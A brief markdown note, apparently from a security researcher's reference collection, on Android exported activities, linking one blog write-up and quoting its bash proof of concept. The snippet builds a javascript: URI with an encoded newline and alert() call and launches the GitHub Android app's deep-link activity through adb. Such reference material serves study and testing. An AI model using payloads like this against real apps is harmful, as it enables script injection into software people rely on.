# android:exported="true"

## Write-ups
|Source|Note|
|---|---|
|[Exploiting Exported activities in Android apps](https://blog.mzfr.me/posts/2020-11-07-exported-activities/)|`#!/bin/bash`<br>`path="$(printf '%s' 'javascript://github.com/%0aalert\(\"mzfr\"\)')"`<br>`adb shell am start -a android.intent.action.VIEW -n com.github.android/.activities.DeepLinkActivity -d $path`
